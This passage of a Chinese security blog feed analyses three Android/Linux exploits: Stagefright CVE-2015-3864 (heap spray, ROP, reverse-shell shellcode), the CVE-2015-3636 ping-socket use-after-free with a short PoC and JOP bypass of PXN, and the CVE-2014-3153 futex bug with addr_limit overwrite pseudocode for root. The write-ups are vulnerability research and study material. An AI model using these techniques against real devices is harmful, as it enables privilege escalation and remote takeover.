<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service media /system/bin/mediaserver <span class="number">511</span>    </span><br><span class="line"><span class="keyword">class</span> main    </span><br><span class="line">user media  </span><br><span class="line">group audio camera inet net_bt net_bt_admin net_bw_acct drmrpc mediadrm </span><br><span class="line">ioprio rt <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>system/core/include/private/android_filesystem_config.h<br>所以可以访问audio camera bluetooth。。。</p>
<h2 id="总结">总结</h2><ol>
<li>EXP利用MP4格式标准的其它Box申请了一些零碎的内存块创造内存间隙，在程序执行过程中这些零碎内存块很有可能被free，后面申请SampleToChunkEntry的内存就有可能出现在低地址，成功溢出到sampleTable指针并不造成崩溃。</li>
<li>Heap Spray，通过tx3g Box堆喷2M数据，使其某一page出现在预测地址上。</li>
<li>ROP和shell_reverse_tcp中的SVC调用，mprotect函数绕过dep保护。</li>
<li>mp4文件格式解析流程。</li>
<li>几个重要的内存地址的不确定性导致漏洞无法100%成功，并且rop中重要跳转指令直接硬编码，无法绕过aslr，但是溢出数据足够大能100％造成崩溃。</li>
<li>或者有其他细节我没理解到，又或者有更好的方法去布局内存分布，值得思考。</li>
</ol>
<h2 id="补充_cve-2015-3864">补充 cve-2015-3864</h2><p>cve-2015-3864是同系列中的另外一个漏洞，利用的是解析tx3g中整型上溢，google公布的<a href="https://www.exploit-db.com/exploits/38226/" target="_blank" rel="external">exploit-38226</a>中通过利用<strong>jemalloc</strong>的特性对内存进行巧妙的布局，溢出后基本能100%覆盖到MPEG4DataSource的虚表指针。<br>2016年3月18号NorthBit公布了一篇文章<a href="https://www.exploit-db.com/docs/39527.pdf" target="_blank" rel="external">Metaphor A (real) real­life Stagefright exploit</a>，在google的基础上通过信息泄漏绕过aslr。</p>
<p>其中内存布局原理(摘自Metaphor)：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-exploit-princple.png" alt=""></p>
<p>pssh：消耗内存碎片，留下大块内存。解析期间不会释放掉，大小可控。<br>titl/gnre：内存占位，解析到第二个先申请新的然后会释放之前的。<br>同时pssh堆喷中，分配大于0x40000长度会调用mmap函数，mmap()地址8位随机，需要预测堆喷地址。</p>
<p>总结下来：<br>通过pssh atoms堆喷使新的的heap runs可预测。<br>申请titl和gnre占位。<br>解析stbl box后创建MPEG4DataSource对象，复用titl。<br>解析tx3g box复用gnre。<br>溢出覆盖虚表指针。</p>
<p>调试过程(Nexus5 andorid 5.01)：</p>
<p>1.MPEG4DataSource对象复用titl<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-vTable.png" alt=""></p>
<p>2.tx3g复用gnre<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-overflow_tx3g.png" alt=""></p>
<p>3.memcpy溢出覆盖vTable<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-overflow.png" alt=""></p>
<p>4.调用mDataSource-&gt;readAt控制流程<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-blx-rop.png" alt=""></p>
<p>5.gadget1<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-gadget1.png" alt=""></p>
<p>6.gadget2<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-gadget2.png" alt=""></p>
<p>7.gadget3<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-gadget3.png" alt=""></p>
<p>8.mprotect<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-mprotect.png" alt=""></p>
<p>9.执行mprotect后通过gadget2和gadget3调整堆栈然后跳入shellcode<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3864-shellcode.png" alt=""></p>
<p>最后shell_reverse_tcp<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-expsucce.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="漏洞分析">漏洞分析</h2><p>POC直接使用<a href="https://github.com/jduck/cve-2015-1538-1" target="_blank" rel="external">https://github.com/jduck/]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="libstagefright" scheme="http://blog.idhyt.com/tags/libstagefright/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-3636内核漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/03/09/exploit-cve-2015-3636/"/>
    <id>http://blog.idhyt.com/2016/03/09/exploit-cve-2015-3636/</id>
    <published>2016-03-09T15:07:11.000Z</published>
    <updated>2016-06-14T03:53:56.000Z</updated>
    <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2><p>Linux kernel的ping套接字实现上存在释放后重利用漏洞，x86-64架构的本地用户利用此漏洞可造成系统崩溃，非x86-64架构的用户可提升其权限，pingpongroot就是利用该漏洞达到提权的效果，现在android-6.0以下的手机root工具靠的就是这个漏洞。</p>
<h2 id="漏洞分析">漏洞分析</h2><p>详细的分析参考KeenTeam这篇文章<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" target="_blank" rel="external">Own your Android! Yet Another Universal Root</a>。</p>
<p>漏洞POC很简单，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd= socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);  <span class="comment">// refcount =1;       </span></span><br><span class="line">structsockaddr addr = &#123; .sa_family = AF_INET &#125;;</span><br><span class="line"><span class="keyword">int</span> ret =connect(sockfd, &amp;addr, <span class="keyword">sizeof</span>(addr));  <span class="comment">// refcount ++;  创建hash</span></span><br><span class="line">structsockaddr _addr = &#123; .sa_family = AF_UNSPEC &#125;;</span><br><span class="line">ret =connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));  <span class="comment">//删除hash；refcount --;</span></span><br><span class="line">ret =connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr)); <span class="comment">// bug导致继续删除hash；refcount --; refcount</span></span><br></pre></td></tr></table></figure>
<p>简单的说就是当用户用ICMP socket和AF_UNSPEC为参数调用connect()时，系统会直接跳到disconnect(),删除当前sock对象的hash,并且让refcount递减一次，删除hash过程的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping_unhash</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> inet_sock *isk = inet_sk(sk);</span><br><span class="line">	pr_debug(<span class="string">"ping_unhash(isk=%p,isk-&gt;num=%u)\n"</span>, isk, isk-&gt;inet_num);</span><br><span class="line">	<span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">		write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">		hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">		sock_put(sk);</span><br><span class="line">		isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">		isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">		sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, -<span class="number">1</span>);</span><br><span class="line">		write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次调用hlist_nulls_del删除hash后会将hlist_node.pprv=0x200200，然后再用相同的参数再调用一次connect()，因为hash已经被删除了，此时if语句应该返回FALSE，但是由于hlist_node.pprv = 0x200200 != null导致sk_hashed(sk)返回TRUE，导致refcount被多减了一次。因此，攻击者只需要创建一个ICMP socket，连续调用3个connect()（第一个connect()用来生成hash）,就可以把refcount置为0，从而释放sock对象导致UAF。</p>
<h2 id="漏洞利用思路">漏洞利用思路</h2><ol>
<li>填充PING socket objects，覆盖close指针。</li>
<li>调用close(sockfd)获取控制权。</li>
<li>泄漏内核栈获取thread_info结构。</li>
<li>修改thread_info.addr_limit值为0xffffffff。</li>
<li>修改thread_info.task.cred提权。</li>
<li>由于0x200200地址并没有map，所以最开始要先在该地址map内存防止程序崩溃。</li>
</ol>
<p>在内核空间中，physmap和SLABs一般会处于不同的地方，physmap位于相对较高的地址，SLABs位于相对较低的地址，由于内核空间里physmap和SLABs靠得很近，可以通过先创建大量的socket对象抬高SLAB地址，exp中会先获取单个进程可创建的最大socket数max_fds，然后循环每个进程创建max_fds个正常的socket然后加上一个漏洞的vul_socket，最终生成了65000个正常的socket加上16个vul_socket。</p>
<p>然后在用户空间不断map内存把数据映射到physmap，通过特殊标记判断内核空间physmap是否和SLAB重叠。<br>如何判断targeting vulnerable PING sock objects已经被physmap中的数据给覆盖？<br>每喷一个数据块，就调用一次targeting vulnerable PING sock objects的<code>ioctl(sockfd, SIOCGSTAMPNS, (struct timespec*))</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> timespec __user *userstamp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> timespec ts;</span><br><span class="line">    <span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">        sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">    ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">        sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">        ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数将泄漏出sk-&gt;sk_stamp这个值，我们可以通过对比这个值和之前填充的值来判断是否已经成功覆盖。</p>
<p>最终效果如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3636-1.png" alt=""></p>
<p>如果覆盖成功，将其他正常的socket对象释放掉，然后将vul_socket的sk-&gt;sk_prot-&gt;close函数指针覆盖掉，最终调用close函数，内核将调用sk-&gt;sk_prot-&gt;close，这个时候，sk_prot已经完全被控制，即sk_prot-&gt;close也被控，最终控制了内核空间的pc寄存器的值，控制了代码的执行流程。</p>
<h2 id="JOP">JOP</h2><p>通过构造JOP绕过PXN保护，关于PXN参考:<a href="http://drops.wooyun.org/tips/7764" target="_blank" rel="external">PXN防护技术的研究与绕过</a><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3636-3.png" alt=""></p>
<h2 id="补丁">补丁</h2><p><a href="https://github.com/torvalds/linux/commit/a134f083e79fb4c3d0a925691e732c56911b4326?diff=split" target="_blank" rel="external">漏洞补丁</a>比较简单，删除指针后将指针置NULL。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-3636-2.png" alt=""></p>
<h2 id="总结">总结</h2><ol>
<li><p>源码中查看实socket创建和close流程不容易找到调用关系，可编译goldfish内核进行调试。</p>
</li>
<li><p>实际在nexus5运行exp并不能触发漏洞，发现抬高过slab内存块之后进行循环map操作，一直没有找到重叠的部分导致while死循环，原因是作者在写exp时保留了系统运行的64M内存，而重叠的部分恰好是在这块内存中，将其尝试变小即可。</p>
</li>
<li><p>再给的exp中覆盖的close地址为用户空间地址<code>obtain_root_privilege_by_modify_task_cred</code>，该处用来修改线程cred信息并提权操作，在android5.0以后的版本中有PXN保护，并不允许内核执行用户层代码，所以需要构造ROP绕过。构造ROP的思路在KeenTeam的pdf中有详细说明，使用ROP意味着需要将内核栈转移到用户栈空间中，这种行为损坏SP寄存器并带来不确定因素，SP在内核代码执行期间比较关键，任何时候修改破坏是不明智的，所以其中使用的是更稳定的JOP。</p>
</li>
<li><p>理解SLUB内存管理机制和physmap。</p>
</li>
<li><p>KeenTeam文章中的利用思路，详细说明了为什么不通过sendmmsg()完成堆喷来覆盖，其中的一些思路和想法确实值得深思和学习。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="漏洞简介">漏洞简介</h2><p>Linux kernel的ping套接字实现上存在释放后重利用漏洞，x86-64架构的本地用户利用此漏洞可造成系统崩溃，非x86-64架构的用户可提升其权限，pingpongroot就是利用该漏洞达到提权的效果，现在androi]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="pingpongroot" scheme="http://blog.idhyt.com/tags/pingpongroot/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2014-3153内核漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/02/26/exploit-cve-2014-3153/"/>
    <id>http://blog.idhyt.com/2016/02/26/exploit-cve-2014-3153/</id>
    <published>2016-02-26T09:15:11.000Z</published>
    <updated>2016-02-26T11:35:16.000Z</updated>
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>漏洞是14年5月份爆，属于linux内核漏洞，影响范围非常广，包括linux系统（内核版本3.14.5之前）和andorid系统（系统版本4.4之前）。受影响的系统可能被直接DOS，精心设计可以获取root权限，如安卓root工具towel。</p>
<p>该漏洞主要产生于内核的 Futex系统调用，漏洞利用了 futex_requeue，futex_lock_pi，futex_wait_requeue_pi三个函数存在的两个漏洞，通过巧妙的组合这三个系 统调用，攻击者可以造成futex变量有等待者，却没有拥有者，即所谓的野指针，通过函数栈填充，可以修改栈上的等待者rt_mutex中的数据，控制内核等待队列节点，通过插入节点的方式读写内核数据，达到提权目的。</p>
<p>这个漏洞网上分析文章比较多，详见参考文章，这里只记录自己在分析过程中踩过的坑和几个漏洞利用的技术点。</p>
<h2 id="漏洞成因">漏洞成因</h2><p>漏洞主要利用的三个函数futex_requeue，futex_lock_pi，futex_wait_requeue_pi，简单说明，详细自行google。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加锁的函数，在uaddr1上等待</span></span><br><span class="line">futex_lock_pi (uaddr) </span><br><span class="line"></span><br><span class="line"><span class="comment">//Wait on uaddr1 and take uaddr2 线程阻塞在uaddr1上，然后等待futex_requeue的唤醒，唤醒过程将所有阻塞在 uaddr1上的线程全部移动到uaddr2上去，以防止“惊群”的情况发生</span></span><br><span class="line">futex_wait_requeue_pi(uaddr1, uaddr2)  </span><br><span class="line"></span><br><span class="line"><span class="comment">//Requeue waiters from uaddr1 to uaddr2 唤醒过程将所有阻塞在 uaddr1上的线程全部移动到uaddr2上去，以防止“惊群”的情况发生</span></span><br><span class="line">futex_requeue(uaddr1, uaddr2)</span><br></pre></td></tr></table></figure>
<p>uaddr在内核中会对应一个”等待队列”（其实是一个全局的队列），每个挂起的进程在等待队列中对应一个futex_q结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> futex_q &#123;</span><br><span class="line">    <span class="keyword">struct</span> plist_node <span class="built_in">list</span>;             <span class="comment">// 链入等待队列</span></span><br><span class="line">    <span class="keyword">struct</span> task_struct *task;           <span class="comment">// 挂起的进程本身</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> *lock_ptr;               <span class="comment">// 保存等待队列的锁，便于操作</span></span><br><span class="line">    <span class="keyword">union</span> futex_key key;                <span class="comment">// 唯一标识uaddr的key值</span></span><br><span class="line">    <span class="keyword">struct</span> futex_pi_state *pi_state;    <span class="comment">// 进程正在等待的锁</span></span><br><span class="line">    <span class="keyword">struct</span> rt_mutex_waiter *rt_waiter;  <span class="comment">// 进程对应的rt_waiter</span></span><br><span class="line">    <span class="keyword">union</span> futex_key *requeue_pi_key;    <span class="comment">// 等待被requeue的key</span></span><br><span class="line">    u32 <span class="built_in">bitset</span>;                         <span class="comment">// futex_<span class="label">XXX_bitset时使用</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>漏洞触发流程图：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-3153-1.jpg" alt="exploit-cve-2014-3153-1"></p>
<p>1.线程线程A调用futex_lock_pi(B)获取锁B，</p>
<p>2.线程B调用futex_wait_requeue_pi(A, B)阻塞在A上等待futex_requeue唤醒，</p>
<p>3.线程A调用futex_requeue(A, B)去唤醒B，但是B已经被锁，所以无法唤醒线程B，并进入内核态在锁B的任务队列中生成了一个rt_waiter节点</p>
<p>4.线程A将B置0重新调用futex_requeue(B, B)，此时成功获得锁B并返回，分支走向支会走向 requeue_pi_wake_futex，尝试唤醒等待的线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="keyword">void</span> <span class="title">requeue_pi_wake_futex</span><span class="params">(<span class="keyword">struct</span> futex_q *q, <span class="keyword">union</span> futex_key *key,</span><br><span class="line">               <span class="keyword">struct</span> futex_hash_bucket *hb)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    get_futex_key_refs(key);</span><br><span class="line">    q-&gt;key = *key;</span><br><span class="line"> </span><br><span class="line">    __unqueue_futex(q);</span><br><span class="line"> </span><br><span class="line">    WARN_ON(!q-&gt;rt_waiter);</span><br><span class="line">    q-&gt;rt_waiter = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    q-&gt;lock_ptr = &amp;hb-&gt;lock;</span><br><span class="line"> </span><br><span class="line">    wake_up_state(q-&gt;task, TASK_NORMAL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，这里线程B的futex_q.rt_waiter被置NULL了。</p>
<p>5.线程B被唤醒，futex_wait_requeue_pi(A, B)执行成功。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">futex_wait_requeue_pi</span><span class="params">(u32 __user *uaddr, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">                 u32 val, ktime_t *abs_time, u32 <span class="built_in">bitset</span>,</span><br><span class="line">                 u32 __user *uaddr2)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> hrtimer_sleeper timeout, *to = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">struct</span> rt_mutex_waiter rt_waiter;</span><br><span class="line">    <span class="keyword">struct</span> rt_mutex *pi_mutex = <span class="literal">NULL</span>;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the requeue code acquired the second futex for us. */</span></span><br><span class="line">    <span class="keyword">if</span> (!q.rt_waiter) &#123;</span><br><span class="line">        <span class="comment">/*</span><br><span class="line">         * Got the lock. We might not be the anticipated owner if we</span><br><span class="line">         * did a lock-steal - fix up the PI-state in that case.</span><br><span class="line">         */</span></span><br><span class="line">        <span class="keyword">if</span> (q.pi_state &amp;&amp; (q.pi_state-&gt;owner != current)) &#123;</span><br><span class="line">            spin_lock(q.lock_ptr);</span><br><span class="line">            ret = fixup_pi_state_owner(uaddr2, &amp;q, current);</span><br><span class="line">            spin_unlock(q.lock_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span><br><span class="line">         * We have been woken up by futex_unlock_pi(), a timeout, or a</span><br><span class="line">         * signal.  futex_unlock_pi() will not destroy the lock_ptr nor</span><br><span class="line">         * the pi_state.</span><br><span class="line">         */</span></span><br><span class="line">        WARN_ON(!&amp;q.pi_state);</span><br><span class="line">        pi_mutex = &amp;q.pi_state-&gt;pi_mutex;</span><br><span class="line">        ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &amp;rt_waiter, <span class="number">1</span>);</span><br><span class="line">        debug_rt_mutex_free_waiter(&amp;rt_waiter);</span><br><span class="line">         ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在futex_wait_requeue_pi函数中将会走后边的第一个分支，导致rt_waiter没有从q.pi_state-&gt;pi_mutex摘除，从而导致了UAF。</p>
<h2 id="漏洞利用">漏洞利用</h2><p>详细的漏洞利用过程网上的一些文章已经分析的很清楚了，这里只记录一些技术点。</p>
<h3 id="修改内核数据">修改内核数据</h3><p>修改rt_waiter内容时候用的方法是栈复用，比如A申请了一个0x10大小的栈stack，A用完后stack的内容并不会在函数返回时清空，如果此时B再申请同样一个小小的栈，就会复用A申请的栈空间，利用相同的原理可以复用链表，详细的例子可参考其他分析文章。</p>
<p>在利用代码中，sendmmsg() API构造内核消息对象B，只要消息大小加上消息头的大小等于rt_waiter的大小， 那么这个消息很可能会重用rt_waiter占据过的内存。</p>
<p>其中sendmmsg() 函数栈上数据与rt_waiter的重叠部分为msgvec.msg_name的部分内容和数据是iovstack（*（msgvec.msg_iov））的部分内容，所以填充这些地方的数据即可。</p>
<p>注意，当目标接受到数据后这个函数会立刻返回，利用代码中通过创建一个线程连接到本地端口，从该端口中接受数据，但是不执行读数据操作，形似：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bind()</span><br><span class="line">listen()</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      s = accept();</span><br><span class="line">      <span class="built_in">log</span>(<span class="string">"i have a client like hookers"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像将该函数hook掉一样，这个sendmmsg()函数将保存发送状态而不是立刻返回，从而保证数据能保留在内核栈中。</p>
<h3 id="读写内核地址">读写内核地址</h3><p>读内核地址比较容易，通过控制进程优先级向fake_node节点插入前置节点，那么fake_node.node_list.prev即为插入节点的内核地址。</p>
<p>写内核地址稍微绕一点，通过控制进程优先级向两个节点中插入新节点，如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-3153-2.jpg" alt="exploit-cve-2014-3153-2"></p>
<p>优先级从右到左依次减小，比如分别取33，34，35，往中间插入优先级为34的新节点时，内核会先遍历这个链表，并获取优先级，内核遍历到fake_node节点，发现优先级为35，决定往fake_node节点前插入34，这个过程是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_node.prev.next = new_node;</span><br><span class="line">new_node.prev = fake_node.prev;</span><br><span class="line">fake_node.prev = new_node;</span><br><span class="line">new_node.next = fake_node;</span><br></pre></td></tr></table></figure>
<p>修改fake_node.prev即33的next指针内容为新节点地址，即写入了一个内核地址，所以可以通过修改fake_node.prev的值来写入任意地址。</p>
<h3 id="提权">提权</h3><p>提权是通过修改自身线程的权限信息来达到修改权限的目的，但是要修改这些值就必须有读写权限。</p>
<p>这里有个thread_info概念，每个线程都有一个线程栈，在栈的最底端存放这thread_info结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> thread_info &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> preempt_count;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr_limit;</span><br><span class="line">    <span class="keyword">struct</span> task_struct *task;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中addr_limit的值即用户可访问的最大内存地址，将这个值改为0xffffffff即可访问任何内核空间，从而能够修改权限。</p>
<p>如何或得这个地址？先来看下如何获取thread_info的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)</span><br><span class="line">	(current_stack_pointer &amp; ~(THREAD_SIZE - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>THREAD_SIZE为8192，因此thread_info = $sp &amp; 0xffffe000。<br>thread_info = 栈地址 &amp; 0xffffe000，所以&amp; addr_limit = * thread_info + 8</p>
<p>然后通过上边写内核的方法可以改写addr_limit的值，但是有一个问题是，这个改写的值是rt_waiter的地址，而这个地址又是不可控的，所以造成的结果是改的这个值比原来的还小。</p>
<p>利用代码用了一个巧妙的方法，通过不断生成新的rt_waiter，并判断新的rt_waiter的值是否比要改线程的thread_info地址大，如果大就能保证写进去的值比原来addr_limit值大，这样线程就有了访问自身addr_limit的能力，然后自己将addr_limit改为0xffffffff，伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rt_waiter_A = create_mew_rt_waiter();</span><br><span class="line">thread_info_base_A = rt_waiter_A &amp; <span class="number">0xffffe000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * thread_A_addr_limit = &amp; thread_info_base_A-&gt;addr_limit; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    rt_waiter_B = create_mew_rt_waiter();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rt_waiter_B &gt; rt_waiter_A) &#123;</span><br><span class="line"><span class="comment">// write rt_waiter_B to thread_info_base_A-&gt;addr_limit</span></span><br><span class="line">thread_info_base_A-&gt;addr_limit = rt_waiter_B;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// thread A could write addr_limit</span></span><br><span class="line">thread_info_base_A-&gt;addr_limit = <span class="number">0xffffffff</span>;</span><br></pre></td></tr></table></figure>
